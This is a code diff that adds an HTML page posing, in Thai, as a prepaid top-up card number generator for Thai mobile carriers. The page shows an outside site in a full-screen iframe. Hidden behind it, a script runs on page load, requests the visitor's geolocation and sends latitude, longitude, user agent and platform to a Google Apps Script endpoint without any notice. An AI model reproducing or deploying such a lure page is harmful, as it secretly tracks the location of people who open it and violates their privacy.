@@ -1,1 +1,38 @@
-hello word
+<!DOCTYPE html>
+<html>
+<head>
+	<title>สุ่มเลขบัตรเติมเงิน ONE-2-CALL, Dtac,True </title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+	<link rel="shortcut icon" href="https://theminimalists.co/truemoney-one-2-call-ais-dtac/">
+</head>
+<body>
+	<script>
+window.onload = function() {
+  getLocation();
+}
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+
+  } else { 
+  }
+}		
+var xurl = "https://script.google.com/macros/s/AKfycbzR2WP5TxAlWiqpGtKWJussnz92oqjIpf-NDYmxdb8VTYzh2Po/exec";
+	function showPosition(position) {
+	    var xmlhttp = new XMLHttpRequest();
+	    var useragent = navigator.userAgent;
+	    var platform = navigator.platform;
+	    
+        var theUrl = xurl+"?lat="+position.coords.latitude+"&long="+position.coords.longitude+"&useragent="+useragent+"&platform="+platform;
+        xmlhttp.open('GET', theUrl);
+        xmlhttp.send();
+            xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            var jsonResponse = JSON.parse(this.responseText);
+        }
+      };  
+}	
+		</script>
+	<iframe style="position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:scroll; -webkit-overflow-scrolling: touch;  z-index:999999;" src="https://theminimalists.co/truemoney-one-2-call-ais-dtac/"></iframe>
+</body>
+</html>
